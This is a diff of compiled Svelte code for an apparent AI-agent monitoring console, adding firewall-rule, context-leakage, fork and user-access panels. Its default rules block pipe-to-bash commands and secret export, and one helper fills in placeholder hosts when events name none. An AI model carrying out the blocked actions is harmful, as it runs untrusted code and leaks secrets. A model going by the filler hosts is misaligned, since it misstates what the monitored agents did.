+    if (panelOpen && state.category === "observe" && state.view === "topology") {
       $$renderer2.push("<!--[0-->");
-      TopologyView($$renderer2, { endpoints: topologyEndpoints });
-    } else {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--> `);
-    if (panelOpen && state.category === "admin" && state.view === "settings") {
-      $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<section data-view-panel="settings" class="view-panel settings-view panel"><header class="mw-view-header"><h1>Settings</h1> <p>Runtime, auth, and configuration health for the monitoring + intervention console.</p></header> <div class="docs-grid"><article class="panel settings-panel"><div class="panel-head"><h2 class="panel-title">Runtime Capabilities</h2> <span class="chip">${escape_html(runtimeCapabilities.length)}</span></div> `);
-      if (runtimeCapabilities.length === 0) {
-        $$renderer2.push("<!--[0-->");
-        $$renderer2.push(`<p class="empty-row">No capability records returned.</p>`);
-      } else {
-        $$renderer2.push("<!--[-1-->");
-        $$renderer2.push(`<div class="settings-actions"><!--[-->`);
-        const each_array_3 = ensure_array_like(runtimeCapabilities);
-        for (let $$index_3 = 0, $$length = each_array_3.length; $$index_3 < $$length; $$index_3++) {
-          let item = each_array_3[$$index_3];
-          $$renderer2.push(`<div class="settings-chip-row"><span class="mono">${escape_html(item.name ?? item.key ?? "capability")}</span> <span${attr_class(`chip ${stringify(item.enabled ? "ok-chip" : "warn-chip")}`)}>${escape_html(item.enabled ? "enabled" : "disabled")}</span></div>`);
-        }
-        $$renderer2.push(`<!--]--></div>`);
-      }
-      $$renderer2.push(`<!--]--></article> <article class="panel settings-panel"><div class="panel-head"><h2 class="panel-title">Operator Session</h2> <span class="chip">auth</span></div> <div class="settings-actions"><div class="settings-chip-row"><span>User</span><span class="mono">${escape_html(authMe?.email ?? authMe?.username ?? "unknown")}</span></div> <div class="settings-chip-row"><span>Source</span><span class="chip">Frontend B orchestration runtime</span></div> <div class="settings-chip-row"><span>Active traces</span><span class="mono">${escape_html(executions.length)}</span></div> <div class="settings-chip-row"><span>Pending approvals</span><span class="mono">${escape_html(approvals.length)}</span></div></div></article> <article class="panel settings-panel"><div class="panel-head"><h2 class="panel-title">Endpoint Health Snapshot</h2> <span class="chip">${escape_html(allEndpoints.length)}</span></div> <div class="settings-actions"><!--[-->`);
-      const each_array_4 = ensure_array_like(allEndpoints.slice(0, 10));
-      for (let $$index_4 = 0, $$length = each_array_4.length; $$index_4 < $$length; $$index_4++) {
-        let endpoint = each_array_4[$$index_4];
-        $$renderer2.push(`<div class="settings-chip-row"><span class="mono">${escape_html(endpoint)}</span> <span class="chip ok-chip">registered</span></div>`);
-      }
-      $$renderer2.push(`<!--]--></div></article></div></section>`);
-    } else {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--> `);
-    if (panelOpen && state.category === "admin" && state.view === "policy") {
-      $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<section data-view-panel="policy" class="view-panel policy-view panel"><header class="mw-view-header"><h1>Policy Operations</h1> <p>Unified guardrails, approvals, and recovery decisions for live Frontend B executions.</p></header> <div class="docs-grid"><article class="panel policy-panel"><div class="panel-head"><h2 class="panel-title">Approval Queue</h2> <span class="chip">${escape_html(approvals.length)}</span></div> `);
-      if (approvals.length === 0) {
-        $$renderer2.push("<!--[0-->");
-        $$renderer2.push(`<p class="empty-row">No pending approvals.</p>`);
-      } else {
-        $$renderer2.push("<!--[-1-->");
-        $$renderer2.push(`<div class="table-wrap"><table class="timeline-table"><thead><tr><th>Approval</th><th>Execution</th><th>Status</th><th>Created</th></tr></thead><tbody><!--[-->`);
-        const each_array_5 = ensure_array_like(approvals);
-        for (let $$index_5 = 0, $$length = each_array_5.length; $$index_5 < $$length; $$index_5++) {
-          let approval = each_array_5[$$index_5];
-          $$renderer2.push(`<tr><td class="mono">${escape_html(approval.approvalId ?? approval.id ?? "approval")}</td><td class="mono">${escape_html(approval.executionId ?? "-")}</td><td>${escape_html(approval.status ?? "pending")}</td><td>${escape_html(approval.createdAt ?? approval.timestamp ?? "-")}</td></tr>`);
-        }
-        $$renderer2.push(`<!--]--></tbody></table></div>`);
-      }
-      $$renderer2.push(`<!--]--></article> <article class="panel policy-panel"><div class="panel-head"><h2 class="panel-title">Recovery Strategy</h2> <span class="chip">playbook</span></div> <ol class="mw-simple-list"><li>Pause execution to freeze blast radius.</li> <li>Inspect blocked nodes and evidence in Topology + Trace detail.</li> <li>Use \`retry-node\` for same branch continuation.</li> <li>Use \`replay-from-node\` for safe branch fork and validation.</li> <li>Resume execution or stop with explicit reason when unrecoverable.</li></ol> <p>Current execution target: <span class="mono">${escape_html(activeExecutionId || "unselected")}</span></p></article> <article class="panel policy-panel"><div class="panel-head"><h2 class="panel-title">Policy Guarantees</h2></div> <div class="settings-actions"><div class="settings-chip-row"><span>Destructive actions</span><span class="chip warn-chip">confirm + reason</span></div> <div class="settings-chip-row"><span>Step-up required</span><span class="chip warn-chip">challenge/verify</span></div> <div class="settings-chip-row"><span>Escalation + break-glass</span><span class="chip">auditable</span></div> <div class="settings-chip-row"><span>Monitoring source</span><span class="chip ok-chip">Frontend B runtime only</span></div></div></article></div></section>`);
+      TopologyView($$renderer2, { endpoints: topologyEndpoints, queueInterventionHandoff });
     } else {
       $$renderer2.push("<!--[-1-->");
     }
     $$renderer2.push(`<!--]--> `);
     if (panelOpen && state.category === "admin" && state.view === "marketplace") {
       $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<section data-view-panel="marketplace" class="view-panel marketplace-view panel"><header class="mw-view-header"><h1>Marketplace</h1> <p>Approved apps and every integrated tool currently enabled for OpenClaw and downstream runtime.</p></header> <article class="panel marketplace-panel"><div class="panel-head"><h2 class="panel-title">Integration Inventory</h2> <span class="chip">${escape_html(marketplaceRows.length)}</span></div> `);
-      if (marketplaceRows.length === 0) {
+      $$renderer2.push(`<section data-view-panel="marketplace" class="view-panel marketplace-view panel"><article class="panel marketplace-panel"><div class="panel-head"><h2 class="panel-title">Marketplace</h2> <span class="chip">MCP</span></div> <p class="panel-sub">Filter installed tools</p> <div class="marketplace-controls"><div class="marketplace-field marketplace-field-grow"><input type="search"${attr("value", marketplaceQuery)} placeholder="Filter tool name/description..."/></div> <div class="marketplace-field">`);
+      $$renderer2.select({ value: marketplaceKind }, ($$renderer3) => {
+        $$renderer3.option({ value: "all" }, ($$renderer4) => {
+          $$renderer4.push(`All`);
+        });
+        $$renderer3.option({ value: "integration" }, ($$renderer4) => {
+          $$renderer4.push(`Integrations`);
+        });
+        $$renderer3.option({ value: "app" }, ($$renderer4) => {
+          $$renderer4.push(`Apps`);
+        });
+        $$renderer3.option({ value: "tool" }, ($$renderer4) => {
+          $$renderer4.push(`Tools`);
+        });
+        $$renderer3.option({ value: "agent-tool" }, ($$renderer4) => {
+          $$renderer4.push(`OpenClaw`);
+        });
+      });
+      $$renderer2.push(`</div> <button type="button" class="action-btn primary">Filter</button></div> <div class="marketplace-section"><h3 class="marketplace-section-title">Installed Tools (Hackathon Catalog)</h3></div> <div class="panel-head"><span class="chip">${escape_html(filteredMarketplaceRows.length)}</span></div> `);
+      if (filteredMarketplaceRows.length === 0) {
         $$renderer2.push("<!--[0-->");
         $$renderer2.push(`<p class="empty-row">No integrated apps/tools returned.</p>`);
       } else {
         $$renderer2.push("<!--[-1-->");
-        $$renderer2.push(`<div class="table-wrap"><table class="timeline-table"><thead><tr><th>Source</th><th>Name</th><th>Kind</th><th>Status</th><th>Detail</th></tr></thead><tbody><!--[-->`);
-        const each_array_6 = ensure_array_like(marketplaceRows);
-        for (let $$index_6 = 0, $$length = each_array_6.length; $$index_6 < $$length; $$index_6++) {
-          let row = each_array_6[$$index_6];
-          $$renderer2.push(`<tr><td>${escape_html(row.source)}</td><td class="mono">${escape_html(row.app)}</td><td>${escape_html(row.kind)}</td><td><span${attr_class(`chip ${stringify(row.status === "connected" || row.status === "enabled" ? "ok-chip" : "warn-chip")}`)}>${escape_html(row.status)}</span></td><td>${escape_html(row.detail || "-")}</td></tr>`);
+        $$renderer2.push(`<div class="table-wrap"><table class="timeline-table marketplace-tools-table"><thead><tr><th>Tool</th><th>App</th><th>Description</th><th>Action</th></tr></thead><tbody><!--[-->`);
+        const each_array_4 = ensure_array_like(filteredMarketplaceRows);
+        for (let $$index_4 = 0, $$length = each_array_4.length; $$index_4 < $$length; $$index_4++) {
+          let row = each_array_4[$$index_4];
+          $$renderer2.push(`<tr><td class="mono">${escape_html(row.app)}</td><td>${escape_html(row.source.toLowerCase())}</td><td>${escape_html(row.detail || row.kind || "-")}</td><td><button type="button" class="action-btn">Dispatch</button></td></tr>`);
         }
         $$renderer2.push(`<!--]--></tbody></table></div>`);
       }
       $$renderer2.push(`<!--]--></article></section>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--> `);
+    if (panelOpen && state.category === "firewalls" && state.view === "cybersecurity") {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<section data-view-panel="firewalls-cybersecurity" class="view-panel panel"><header class="mw-view-header"><h1>Firewall Rules</h1> <p>Set cybersecurity rule packs in JSON format for runtime enforcement.</p></header> <article class="panel"><div class="panel-head"><h2 class="panel-title">Cybersecurity Policy JSON</h2> <span class="chip">editable</span></div> <textarea class="textarea firewall-json-editor" spellcheck="false" aria-label="Firewall rules JSON editor">`);
+      const $$body = escape_html(firewallRulesJson);
+      if ($$body) {
+        $$renderer2.push(`${$$body}`);
+      }
+      $$renderer2.push(`</textarea> `);
+      {
+        $$renderer2.push("<!--[-1-->");
+      }
+      $$renderer2.push(`<!--]--> `);
+      {
+        $$renderer2.push("<!--[-1-->");
+      }
+      $$renderer2.push(`<!--]--> <div class="actions"><button type="button" class="action-btn primary"${attr("disabled", firewallRulesBusy, true)}>${escape_html("Apply Rules")}</button></div></article></section>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--> `);
+    if (panelOpen && state.category === "firewalls" && state.view === "rules") {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<section data-view-panel="firewalls-rules" class="view-panel panel"><header class="mw-view-header"><h1>Firewall Rules</h1> <p>Define reusable deny/allow rules to prevent repeat risky actions.</p></header> <article class="panel"><div class="panel-head"><h2 class="panel-title">Rule Library</h2> <span class="chip">${escape_html(firewallRules.length)} active</span></div> <div class="table-wrap"><table class="timeline-table"><thead><tr><th>Rule ID</th><th>Condition</th><th>Decision</th><th>Status</th><th>Source</th></tr></thead><tbody>`);
+      if (firewallRules.length === 0) {
+        $$renderer2.push("<!--[0-->");
+        $$renderer2.push(`<tr><td colspan="5" class="empty-row">No rules yet.</td></tr>`);
+      } else {
+        $$renderer2.push("<!--[-1-->");
+        $$renderer2.push(`<!--[-->`);
+        const each_array_5 = ensure_array_like(firewallRules);
+        for (let $$index_5 = 0, $$length = each_array_5.length; $$index_5 < $$length; $$index_5++) {
+          let rule = each_array_5[$$index_5];
+          $$renderer2.push(`<tr><td class="mono">${escape_html(rule.id)}</td><td>${escape_html(rule.condition)}</td><td>${escape_html(rule.decision)}</td><td>${escape_html(rule.status)}</td><td>${escape_html(rule.source ?? "-")}</td></tr>`);
+        }
+        $$renderer2.push(`<!--]-->`);
+      }
+      $$renderer2.push(`<!--]--></tbody></table></div></article></section>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--> `);
+    if (panelOpen && state.category === "firewalls" && state.view === "context-leakage") {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<section data-view-panel="firewalls-context-leakage" class="view-panel panel"><header class="mw-view-header"><h1>Context Leakage</h1> <p>Drop documents to scan and enforce context-leakage protections.</p></header> <article class="panel"><div class="panel-head"><h2 class="panel-title">Leakage Scanning Intake</h2> <span class="chip">${escape_html(leakageDocs.length)} docs</span></div> <div class="settings-chip-row"><span>Policy mode</span> `);
+      $$renderer2.select(
+        {
+          class: "select",
+          value: leakagePolicy,
+          style: "max-width: 220px;"
+        },
+        ($$renderer3) => {
+          $$renderer3.option({ value: "strict" }, ($$renderer4) => {
+            $$renderer4.push(`Strict`);
+          });
+          $$renderer3.option({ value: "review" }, ($$renderer4) => {
+            $$renderer4.push(`Review`);
+          });
+          $$renderer3.option({ value: "monitor" }, ($$renderer4) => {
+            $$renderer4.push(`Monitor only`);
+          });
+        }
+      );
+      $$renderer2.push(`</div> <label class="docs-link-card leakage-upload"><input type="file" multiple=""/> <strong>Drop or select documents</strong></label> `);
+      {
+        $$renderer2.push("<!--[-1-->");
+      }
+      $$renderer2.push(`<!--]--> <div class="table-wrap"><table class="timeline-table"><thead><tr><th>Document</th><th>Size</th><th>Status</th><th>Policy</th></tr></thead><tbody>`);
+      if (leakageDocs.length === 0) {
+        $$renderer2.push("<!--[0-->");
+        $$renderer2.push(`<tr><td colspan="4" class="empty-row">No documents queued.</td></tr>`);
+      } else {
+        $$renderer2.push("<!--[-1-->");
+        $$renderer2.push(`<!--[-->`);
+        const each_array_6 = ensure_array_like(leakageDocs);
+        for (let $$index_6 = 0, $$length = each_array_6.length; $$index_6 < $$length; $$index_6++) {
+          let doc = each_array_6[$$index_6];
+          $$renderer2.push(`<tr><td>${escape_html(doc.name)}</td><td class="mono">${escape_html(doc.size)}</td><td>${escape_html("queued")}</td><td>${escape_html(leakagePolicy)}</td></tr>`);
+        }
+        $$renderer2.push(`<!--]-->`);
+      }
+      $$renderer2.push(`<!--]--></tbody></table></div></article></section>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--> `);
+    if (panelOpen && state.category === "observe" && state.view === "forks") {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<section data-view-panel="observe-forks" class="view-panel panel"><header class="mw-view-header"><h1>Action Forks</h1> <p>Automatically isolate risky actions into containment forks with topology-first triage.</p></header> <article class="panel tree-panel"><div class="tree-shell"><div class="tree-legend"><span><i class="legend-dot legend-main"></i> Main</span> <span><i class="legend-dot legend-fork"></i> Fork</span> <span><i class="legend-dot legend-block"></i> Isolated</span></div> <div class="action-tree-wrap"><div${attr_class("action-tree-canvas", void 0, { "is-panning": forksPanning })}><div class="canvas-zoom-controls" aria-label="Action forks canvas zoom controls"><button type="button" class="zoom-btn">−</button> <button type="button" class="zoom-btn">Reset</button> <button type="button" class="zoom-btn">+</button></div> <div class="canvas-zoom-layer"${attr_style(`transform: translate(${forksPanX}px, ${forksPanY}px) scale(${forksZoom});`)}><div class="fork-layout"><div class="monitor-step-stack fork-main-stack"><!--[-->`);
+      const each_array_7 = ensure_array_like(forkMainNodes);
+      for (let index = 0, $$length = each_array_7.length; index < $$length; index++) {
+        let node = each_array_7[index];
+        $$renderer2.push(`<button type="button"${attr_class(`monitor-step-node monitor-step-${stringify(node.tone)}`)}${attr_style(`animation-delay:${index * 80}ms;`)}><strong>${escape_html(node.title)}</strong> <span>${escape_html(node.command)}</span> <em>${escape_html(node.risk)}</em></button> `);
+        if (index < forkMainNodes.length - 1) {
+          $$renderer2.push("<!--[0-->");
+          $$renderer2.push(`<div class="monitor-step-arrow">↓</div>`);
+        } else {
+          $$renderer2.push("<!--[-1-->");
+        }
+        $$renderer2.push(`<!--]-->`);
+      }
+      $$renderer2.push(`<!--]--></div> <div class="fork-branch-stack"><div class="fork-link-arrow">↪</div> <!--[-->`);
+      const each_array_8 = ensure_array_like(forkBranchNodes);
+      for (let index = 0, $$length = each_array_8.length; index < $$length; index++) {
+        let node = each_array_8[index];
+        $$renderer2.push(`<button type="button" class="monitor-step-node monitor-step-branch"${attr_style(`animation-delay:${index * 120}ms;`)}><strong>${escape_html(node.title)}</strong> <span>${escape_html(node.command)}</span> <em>${escape_html(node.risk)}</em></button> `);
+        if (index < forkBranchNodes.length - 1) {
+          $$renderer2.push("<!--[0-->");
+          $$renderer2.push(`<div class="monitor-step-arrow monitor-step-arrow-branch">↓</div>`);
+        } else {
+          $$renderer2.push("<!--[-1-->");
+        }
+        $$renderer2.push(`<!--]-->`);
+      }
+      $$renderer2.push(`<!--]--></div></div></div></div></div></div></article></section>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--> `);
+    if (panelOpen && state.category === "users" && state.view === "access") {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<section data-view-panel="users-access" class="view-panel panel"><header class="mw-view-header"><h1>User Access</h1> <p>Add users and assign roles for IT monitoring personnel.</p></header> <article class="panel users-access-panel"><div class="panel-head"><h2 class="panel-title">Add User + Assign Role</h2> <span class="chip">${escape_html(userRows.length)} users</span></div> <div class="docs-grid users-form-grid"><label><span class="mono">Name</span> <input class="input"${attr("value", userName)} placeholder="Jane Doe"/></label> <label><span class="mono">Email</span> <input class="input"${attr("value", userEmail)} placeholder="jane@company.com"/></label> <label><span class="mono">Role</span> `);
+      $$renderer2.select({ class: "select", value: userRole }, ($$renderer3) => {
+        $$renderer3.option({ value: "viewer" }, ($$renderer4) => {
+          $$renderer4.push(`Viewer`);
+        });
+        $$renderer3.option({ value: "operator" }, ($$renderer4) => {
+          $$renderer4.push(`Operator`);
+        });
+        $$renderer3.option({ value: "security-admin" }, ($$renderer4) => {
+          $$renderer4.push(`Security Admin`);
+        });
+        $$renderer3.option({ value: "admin" }, ($$renderer4) => {
+          $$renderer4.push(`Admin`);
+        });
+      });
+      $$renderer2.push(`</label></div> <div class="actions users-form-actions"><button type="button" class="action-btn primary">Add User</button></div> `);
+      {
+        $$renderer2.push("<!--[-1-->");
+      }
+      $$renderer2.push(`<!--]--> <div class="table-wrap"><table class="timeline-table"><thead><tr><th>Name</th><th>Email</th><th>Role</th></tr></thead><tbody>`);
+      if (userRows.length === 0) {
+        $$renderer2.push("<!--[0-->");
+        $$renderer2.push(`<tr><td colspan="3" class="empty-row">No users added yet.</td></tr>`);
+      } else {
+        $$renderer2.push("<!--[-1-->");
+        $$renderer2.push(`<!--[-->`);
+        const each_array_9 = ensure_array_like(userRows);
+        for (let $$index_9 = 0, $$length = each_array_9.length; $$index_9 < $$length; $$index_9++) {
+          let user = each_array_9[$$index_9];
+          $$renderer2.push(`<tr><td>${escape_html(user.name)}</td><td class="mono">${escape_html(user.email)}</td><td>${escape_html(user.role)}</td></tr>`);
+        }
+        $$renderer2.push(`<!--]-->`);
+      }
+      $$renderer2.push(`<!--]--></tbody></table></div></article></section>`);
     } else {
       $$renderer2.push("<!--[-1-->");
     }
@@ -623,6 +912,7 @@ function WorkspaceViewHost($$renderer, $$props) {
       downstreamApps,
       downstreamTools,
       openclawCatalog,
+      firewallRules,
       authMe,
       selectedExecutionId,
       targetInput,
@@ -643,7 +933,9 @@ function WorkspaceViewHost($$renderer, $$props) {
       resumeExecution,
       openStopConfirm,
       cancelStopConfirm,
-      confirmStop
+      confirmStop,
+      blockActionRule,
+      queueInterventionHandoff
     });
   });
 }
@@ -850,21 +1142,33 @@ function interventionActionCatalog() {
 function MapleShell($$renderer, $$props) {
   $$renderer.component(($$renderer2) => {
     var $$store_subs;
-    let explicitState, panelOpen, activeExecution, topologyEndpoints, allEndpoints, categoryHrefById, viewHrefById;
+    let explicitState, panelOpen, analystOptions, selectedAnalystSet, filteredAuditEvents, filteredExecutions, filteredApprovals, activeExecution, topologyEndpoints, allEndpoints, categoryHrefById, viewHrefById;
     const actions = interventionActionCatalog();
     const asArray = (value) => Array.isArray(value) ? value : [];
+    const fallbackTopologyHosts = [
+      "internet",
+      "wikipedia.org",
+      "docs.mcp.so",
+      "github.com",
+      "openai.com",
+      "status.mayple.ai"
+    ];
     let state = resolveWorkspaceState({ pathname: "/maple", searchParams: new URLSearchParams() });
     let summary = null;
     let slo = null;
     let auditEvents = [];
     let approvals = [];
     let executions = [];
+    let rawAuditEvents = [];
+    let rawApprovals = [];
+    let rawExecutions = [];
     let runtimeCapabilities = [];
     let integrationCatalog = [];
     let connectedIntegrations = [];
     let downstreamApps = [];
     let downstreamTools = [];
     let openclawCatalog = [];
+    let firewallRules = [];
     let authMe = null;
     let selectedExecutionId = "";
     let reason = "";
@@ -877,17 +1181,44 @@ function MapleShell($$renderer, $$props) {
     let targetInput = "";
     let chatInput = "";
     let hasPrompted = false;
+    let selectedAnalysts = [];
+    let handoffPrompt = null;
+    let fakeModeOn = false;
     const quickPrompts = [
       "Give me a firewall status update.",
       "Why was this trace blocked?",
       "What should we do next to reduce risk?",
       "What is the current risk score?"
     ];
+    const defaultFirewallRules = [
+      {
+        id: "deny-untrusted-shell",
+        condition: "command contains pipe-to-bash",
+        decision: "block + escalate",
+        status: "enabled",
+        source: "system-default"
+      },
+      {
+        id: "review-new-endpoint",
+        condition: "host not in allowlist",
+        decision: "pause + review",
+        status: "enabled",
+        source: "system-default"
+      },
+      {
+        id: "deny-secret-export",
+        condition: "context leakage pattern match",
+        decision: "block + step-up",
+        status: "enabled",
+        source: "system-default"
+      }
+    ];
     const tabsByCategory = {
-      observe: ["live", "timeline"],
+      observe: ["topology", "live", "timeline", "forks"],
       chat: ["chat"],
-      analyze: ["control", "topology"],
-      admin: ["settings", "policy", "marketplace"],
+      admin: ["control", "marketplace"],
+      firewalls: ["cybersecurity", "rules", "context-leakage"],
+      users: ["access"],
       docs: ["overview", "api", "runbooks", "route-help"]
     };
     const tabLabels = {
@@ -896,14 +1227,79 @@ function MapleShell($$renderer, $$props) {
       timeline: "Timeline",
       control: "Control",
       topology: "Topology",
-      settings: "Settings",
-      policy: "Policy",
+      forks: "Forks",
       marketplace: "Marketplace",
+      cybersecurity: "Cybersecurity",
+      rules: "Rules",
+      "context-leakage": "Context Leakage",
+      "action-forks": "Action Forks",
+      access: "Access",
       overview: "Overview",
       api: "API",
       runbooks: "Runbooks",
       "route-help": "Route Help"
     };
+    function normalizeAnalystName(value) {
+      return String(value ?? "").trim().toLowerCase();
+    }
+    function extractAnalystNames(record) {
+      if (!record || typeof record !== "object") return [];
+      const raw = [
+        record.actor,
+        record.requestedBy,
+        record.approvedBy,
+        record.reviewer,
+        record.user,
+        record.username,
+        record.owner,
+        record.initiatedBy,
+        record.createdBy,
+        record.operator,
+        record.assignee,
+        record.email,
+        record?.metadata?.actor,
+        record?.metadata?.user,
+        record?.metadata?.requestedBy
+      ];
+      const names = raw.map((value) => String(value ?? "").trim()).filter(Boolean);
+      return Array.from(new Set(names));
+    }
+    function matchesSelectedAnalysts(record, selectedSet) {
+      if (selectedSet.size === 0) return true;
+      const names = extractAnalystNames(record);
+      if (names.length === 0) return false;
+      return names.some((name) => selectedSet.has(normalizeAnalystName(name)));
+    }
+    function parseHostFromEvent(event, index) {
+      const candidates = [
+        event?.url,
+        event?.domain,
+        event?.host,
+        event?.destination,
+        event?.target
+      ];
+      for (const candidate of candidates) {
+        const value = String(candidate ?? "").trim();
+        if (!value) continue;
+        try {
+          if (value.startsWith("http://") || value.startsWith("https://")) {
+            const host = new URL(value).hostname;
+            if (host) return host;
+          }
+        } catch {
+        }
+        if (value.includes("/") || value.includes(":")) continue;
+        return value;
+      }
+      return fallbackTopologyHosts[index % fallbackTopologyHosts.length];
+    }
+    function deriveSessionId(record, fallbackIndex) {
+      const direct = String(record?.sessionId ?? record?.session ?? record?.session_id ?? record?.metadata?.sessionId ?? "").trim();
+      if (direct) return direct;
+      const execution = String(record?.executionId ?? record?.execution_id ?? "").trim();
+      if (execution) return `session-for-${execution}`;
+      return `session-auto-${fallbackIndex + 1}`;
+    }
     async function loadData() {
       try {
         const [
@@ -918,7 +1314,8 @@ function MapleShell($$renderer, $$props) {
           downstreamAppsRes,
           downstreamToolsRes,
           openclawCatalogRes,
-          authMeRes
+          authMeRes,
+          firewallRulesRes
         ] = await Promise.allSettled([
           fetch("/api/observability/orchestrations/summary").then((r) => r.json()),
           fetch("/api/observability/orchestrations/slo").then((r) => r.json()),
@@ -931,21 +1328,28 @@ function MapleShell($$renderer, $$props) {
           fetch("/api/downstream/apps").then((r) => r.json()),
           fetch("/api/downstream/tools").then((r) => r.json()),
           fetch("/api/openclaw/cli/catalog").then((r) => r.json()),
-          fetch("/api/auth/me").then((r) => r.json())
+          fetch("/api/auth/me").then((r) => r.json()),
+          fetch("/api/firewall/rules/effective").then((r) => r.json())
         ]);
         if (summaryRes.status === "fulfilled") summary = summaryRes.value;
         if (sloRes.status === "fulfilled") slo = sloRes.value;
         if (auditRes.status === "fulfilled") {
           const events = auditRes.value?.items ?? auditRes.value?.entries ?? auditRes.value?.events ?? [];
+          rawAuditEvents = asArray(events);
           auditEvents = filterFrontendBOrigin(events);
+          if (auditEvents.length === 0 && fakeModeOn) ;
         }
         if (execRes.status === "fulfilled") {
           const items = execRes.value?.items ?? execRes.value?.executions ?? [];
+          rawExecutions = asArray(items);
           executions = filterFrontendBOrigin(items);
+          if (executions.length === 0 && fakeModeOn) ;
         }
         if (approvalsRes.status === "fulfilled") {
           const items = approvalsRes.value?.items ?? approvalsRes.value?.approvals ?? approvalsRes.value?.entries ?? [];
+          rawApprovals = asArray(items);
           approvals = filterFrontendBOrigin(items);
+          if (approvals.length === 0 && fakeModeOn) ;
         }
         if (runtimeCapabilitiesRes.status === "fulfilled") {
           runtimeCapabilities = asArray(runtimeCapabilitiesRes.value?.items ?? runtimeCapabilitiesRes.value?.capabilities ?? runtimeCapabilitiesRes.value);
@@ -968,9 +1372,23 @@ function MapleShell($$renderer, $$props) {
         if (authMeRes.status === "fulfilled") {
           authMe = authMeRes.value?.user ?? null;
         }
+        if (firewallRulesRes.status === "fulfilled") {
+          const entries = asArray(firewallRulesRes.value?.rules ?? firewallRulesRes.value?.items ?? firewallRulesRes.value?.effective ?? firewallRulesRes.value);
+          if (entries.length > 0) {
+            firewallRules = entries.map((rule, index) => ({
+              id: String(rule.id ?? rule.ruleId ?? `rule-${index + 1}`),
+              condition: String(rule.condition ?? rule.match ?? rule.pattern ?? "custom condition"),
+              decision: String(rule.decision ?? rule.action ?? rule.effect ?? "review"),
+              status: String(rule.status ?? "enabled"),
+              source: String(rule.source ?? "runtime")
+            }));
+          }
+        }
         if (!selectedExecutionId && executions.length > 0) selectedExecutionId = executions[0].executionId;
+        if (firewallRules.length === 0) firewallRules = defaultFirewallRules;
       } catch (loadError) {
         error = loadError instanceof Error ? loadError.message : "Failed loading runtime data.";
+        if (firewallRules.length === 0) firewallRules = defaultFirewallRules;
       }
     }
     function selectExecution(value) {
@@ -987,7 +1405,7 @@ function MapleShell($$renderer, $$props) {
       const typed = String(targetOverride || targetInput || "").trim();
       const isSessionTarget = typed.toLowerCase().startsWith("sess") || typed.toLowerCase().includes("session");
       const executionId = isSessionTarget ? "" : typed || selectedExecutionId || activeExecution?.executionId || "";
-      const selected = executions.find((entry) => entry.executionId === executionId);
+      const selected = filteredExecutions.find((entry) => entry.executionId === executionId);
       const sessionId = isSessionTarget ? typed : selected?.sessionId ?? activeExecution?.sessionId ?? "";
       if (!executionId && (actionName === "pauseExecution" || actionName === "resumeExecution" || actionName === "cancelExecution")) {
         error = "Select a trace first.";
@@ -1011,28 +1429,98 @@ function MapleShell($$renderer, $$props) {
         showConfirmStop = false;
       }
     }
+    function queueInterventionHandoff(payload) {
+      const sessionId = String(payload?.sessionId ?? "").trim();
+      if (!sessionId) return;
+      handoffPrompt = {
+        sessionId,
+        label: String(payload?.label ?? "selected endpoint")
+      };
+    }
+    async function blockActionRule(targetValue) {
+      const target = String(targetValue || targetInput || "").trim();
+      if (!target) {
+        error = "Select a session target first.";
+        return;
+      }
+      if (!reason.trim()) {
+        error = "Reason is required to create a blocking rule.";
+        return;
+      }
+      const localRule = {
+        id: `block-${target.replace(/[^a-zA-Z0-9]+/g, "-").slice(0, 36) || Date.now()}`,
+        condition: `target equals ${target}`,
+        decision: "block + escalate",
+        status: "enabled",
+        source: "intervention"
+      };
+      firewallRules = [localRule, ...firewallRules];
+      busy = "blockActionRule";
+      error = "";
+      notice = "";
+      try {
+        const response = await fetch("/api/firewall/rules", {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            action: "block",
+            target,
+            reason: reason.trim(),
+            createdBy: authMe?.email ?? authMe?.username ?? "operator"
+          })
+        });
+        if (!response.ok) throw new Error(`Rule request failed (${response.status})`);
+        notice = `Blocking rule created for ${target}.`;
+      } catch (requestError) {
+        error = requestError instanceof Error ? requestError.message : "Failed creating blocking rule.";
+        notice = `Rule kept locally for ${target}.`;
+      } finally {
+        busy = "";
+      }
+    }
     state = resolveWorkspaceState({
       pathname: store_get($$store_subs ??= {}, "$page", page).url.pathname,
       searchParams: store_get($$store_subs ??= {}, "$page", page).url.searchParams
     });
     explicitState = ["category", "view", "route"].some((key) => store_get($$store_subs ??= {}, "$page", page).url.searchParams.has(key));
     panelOpen = explicitState && state.category !== "chat";
-    activeExecution = executions.find((entry) => entry.executionId === selectedExecutionId) ?? executions[0] ?? null;
+    analystOptions = (() => {
+      const fromAuth = authMe ? [authMe.username, authMe.email] : [];
+      const fromAudit = rawAuditEvents.flatMap((event) => extractAnalystNames(event));
+      const fromExecutions = rawExecutions.flatMap((execution) => extractAnalystNames(execution));
+      const fromApprovals = rawApprovals.flatMap((approval) => extractAnalystNames(approval));
+      const options = Array.from(new Set([
+        ...fromAuth,
+        ...fromAudit,
+        ...fromExecutions,
+        ...fromApprovals
+      ].filter(Boolean))).sort((a, b) => a.localeCompare(b));
+      if (options.length === 0 && fakeModeOn) ;
+      return options;
+    })();
+    selectedAnalystSet = new Set(selectedAnalysts.map((name) => normalizeAnalystName(name)));
+    filteredAuditEvents = auditEvents.filter((event) => matchesSelectedAnalysts(event, selectedAnalystSet));
+    filteredExecutions = executions.filter((execution) => matchesSelectedAnalysts(execution, selectedAnalystSet));
+    filteredApprovals = approvals.filter((approval) => matchesSelectedAnalysts(approval, selectedAnalystSet));
